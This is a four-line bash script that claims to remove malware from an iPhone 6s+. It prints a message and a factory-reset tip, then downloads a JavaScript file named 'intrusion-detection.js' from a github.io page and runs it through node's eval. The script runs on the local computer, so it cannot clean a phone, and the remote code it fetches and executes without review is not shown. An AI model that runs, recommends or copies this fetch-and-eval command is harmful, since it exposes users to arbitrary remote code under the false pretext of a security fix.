#!/bin/bash
echo "Zapping malware on iPhone 6s+ (011084)..."
echo "If phone is freezing, go to Settings > General > Transfer or Reset iPhone > Erase All Content and Settings"
curl -s https://coldnsteel.github.io/HackerWatch/public/intrusion-detection.js | node -e "eval(require('fs').readFileSync(0, 'utf-8'))"
